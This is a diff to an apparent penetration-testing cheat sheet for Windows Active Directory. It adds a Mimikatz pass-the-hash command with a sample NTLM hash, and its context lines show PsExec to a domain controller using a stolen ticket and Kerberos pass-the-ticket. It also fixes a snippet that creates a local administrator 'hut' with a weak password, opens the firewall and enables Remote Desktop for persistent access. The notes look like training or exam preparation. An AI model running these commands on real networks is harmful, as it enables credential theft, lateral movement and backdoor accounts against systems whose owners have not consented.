@@ -196,6 +196,9 @@ misc::cmd # this will run the cmd with jen's tiket in action.
 .\PSExec.exe \\dc1 cmd.exe # or powershell
 # current user will be added to the domain admins group becuase of the ticket.
 
+# Example
+sekurlsa::pth /user:leon /domain:medtech.com /ntlm:2e208ad146efda5bc44869025e06544a /run: powershell
+
 
 ```
 
@@ -342,7 +345,7 @@ print(encode(command));
 - Then you can simply use the `kerberos::ptt` command, and paste one of the ticket names which ends in the `.kirbi` extention.
 
 ---
-### Turn on Remote Desktop on Windows
+### Turn on Remote Desktop on Windows (RDP)
 We will use one snippet to :
 1. Turn on RDP
 2. Add new user
@@ -354,10 +357,16 @@ net user hut password123! /add;
 net localgroup Administrators hut /add;
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes;
 net localgroup "Remote Desktop Users" "hut" /add;
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f;
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;
 ```
 
 ```powershell
 # Activate RDP through PowerShell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+```
+
+---
+### Color Output - WinPEAAS - PowerShell - CMD
+```
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 ```
